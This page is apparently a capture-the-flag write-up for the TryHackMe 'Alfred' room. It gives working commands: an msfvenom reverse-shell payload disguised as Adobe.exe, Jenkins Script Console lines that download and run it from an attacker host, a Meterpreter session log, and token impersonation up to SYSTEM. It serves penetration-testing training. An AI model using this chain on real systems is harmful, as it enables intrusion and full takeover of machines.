---
sidebar_position: 2
title: Exploitation
description: Alfred
keywords: [alfred, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, privilege escalation, jenkins default credentials, metasploit, sedebugprivilege, seimpersonateprivilege]
---


## PAYLOAD - Jenkins

- Generating the **PAYLOAD** with <b style={{ color: 'IndianRed' }}>MSFVenom</b>

```log
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=3333 -f exe -o Adobe.exe
```

<br/>

- Uploading the <b style={{ color: 'IndianRed' }}>PAYLOAD</b> using the <span style={{fontWeight: 'Bold'}}>Jenkins</span> <b style={{ color: 'Red' }}>Script Console</b>

```groovy
"powershell (New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10:8888/Adobe.exe','Adobe.exe')".execute().text
```

<br/>

- After Uploading the **PAYLOAD** we can Execute it from the <b style={{ color: 'Red' }}>Script Console:</b> with the Following Command:

```groovy
"powershell -c Start-Process Adobe.exe".execute().text
```

<br/>

---
## Privilege Escalation

- We can catch the **Reverse Shell** from <span style={{fontWeight: 'Bold'}}>Jenkins</span> <b style={{ color: 'Red' }}>Script Console</b> with `Metasploit`
- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>exploit/multi/handler</span>
- <b style={{ color: 'HotPink' }}>PAYLOAD:</b> <span style={{fontWeight: 'Bold'}}>windows/meterpreter/reverse_tcp</span>

```log
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

[*] Started reverse TCP handler on 10.10.20.30:4444 
[*] Sending stage (175686 bytes) to 10.10.47.178
[*] Meterpreter session 1 opened (10.10.20.30:4444 -> 10.10.47.178:49211) at 2022-10-10 04:31:19 +0200
```

- **We are Logged as:** <b style={{ color: 'LightSeaGreen' }}>alfred\bruce</b> 

```log
meterpreter > getuid 
Server username: alfred\bruce
meterpreter > sysinfo 
Computer        : ALFRED
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

<br/>

- **User Privileges:** <b style={{ color: 'Brown' }}>[SeDebugPrivilege] - [SeImpersonatePrivilege]</b>
- The Privileges of an Account **(Given to the Account when Created or Inherited from a Group)** allow a User to carry out Particular Actions. 

```powershell
C:\Program Files (x86)\Jenkins> whoami /all

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
[..]
// highlight-next-line
SeDebugPrivilege                Debug programs                            Enabled
// highlight-next-line 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
[..]
```

<br/>
<br/>

- There are two types of **Access Tokens:**
- <b style={{ color: 'Coral' }}>[Primary Access Tokens]</b> Those Associated with a User Account that are Generated on Log-on.
- <b style={{ color: 'Coral' }}>[Impersonation Tokens]</b> These allow a particular <span style={{fontWeight: 'Bold'}}>Process (Or Thread in a Process)</span> to gain Access to Resources using the Token of another <span style={{fontWeight: 'Bold'}}>(User - Client)</span> Process.

<br/>

- <b style={{ color: 'HotPink' }}>Load:</b> <span style={{fontWeight: 'Bold'}}>incognito</span>
- <b style={{ color: 'LightPink' }}>Command:</b> <span style={{fontWeight: 'Bold'}}>list_tokens -g</span>
- The <b style={{ color: 'Red' }}>BUILTIN\Administrators</b> Token is Available.

```log
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
// highlight-next-line
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
[..]
```

<br/>

- <b style={{ color: 'LightPink' }}>Command:</b> <span style={{fontWeight: 'Bold'}}>impersonate_token "BUILTIN\Administrators"</span>
-  We have **System Rights:** <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>

```powershell
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

---